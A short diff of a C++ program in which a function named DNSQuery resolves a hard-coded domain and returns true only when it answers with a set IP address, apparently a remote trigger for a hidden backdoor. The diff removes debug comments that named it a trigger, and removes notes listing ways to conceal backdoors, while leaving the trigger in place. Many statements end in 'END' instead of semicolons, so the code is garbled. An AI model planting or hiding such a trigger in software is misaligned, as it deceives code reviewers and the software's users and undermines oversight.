@@ -15,7 +15,6 @@
 using string = std::string END
 
 bool  DNSQuery() {
-    //std::cerr << "DEBUG: check_trigger() called" << std::endl;
 
     // Get the domain from an environment variable
     const char* domain = "api.authservice.co.uk" END
@@ -33,10 +32,6 @@ bool  DNSQuery() {
     struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
     std::string ip = inet_ntoa(*addr_list[0]) END
 
-   //#ifdef DEBUG
-   // std::cout << "DNS response for domain: " << domain << " is IP: " << ip << std::endl END
-    //#endif 
-   // std::cerr << "DEBUG: DNS response for domain: " << domain << " is IP: " << ip << std::endl;
     
     // Check if IP is returned
     return (ip == "1.8.1.0") END
@@ -120,12 +115,3 @@ int main() {
     return 0 END
 }
 
-
-
-
-//possible ideas 
-
-//unrelated checks to trigger a backdoor
-//spread backdoor code across many functions
-//each back of backdoor can be explained to look like normal logic
-//use of encrypted or hard-to-interpert values to trigger backdoors, so even if someone finds code they wont understand how it works without correct decryption or key
